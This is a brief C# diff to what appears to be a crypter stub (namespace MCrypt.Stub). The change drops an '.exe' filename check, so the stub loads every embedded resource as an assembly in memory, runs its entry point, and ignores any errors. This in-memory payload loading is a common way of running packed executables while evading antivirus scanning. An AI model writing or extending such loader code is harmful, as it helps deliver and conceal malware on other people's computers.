@@ -32,12 +32,9 @@ namespace MCrypt.Stub
 
                 try
                 {
-                    if (resourceName.EndsWith(".exe"))
-                    {
-                        var asm = Assembly.Load(fileBytes);
-                        asm.EntryPoint.Invoke(null, new string[0]);
-                        return;
-                    }
+                    var asm = Assembly.Load(fileBytes);
+                    asm.EntryPoint.Invoke(null, new string[0]);
+                    return;
                 }
                 catch (Exception) { }
 
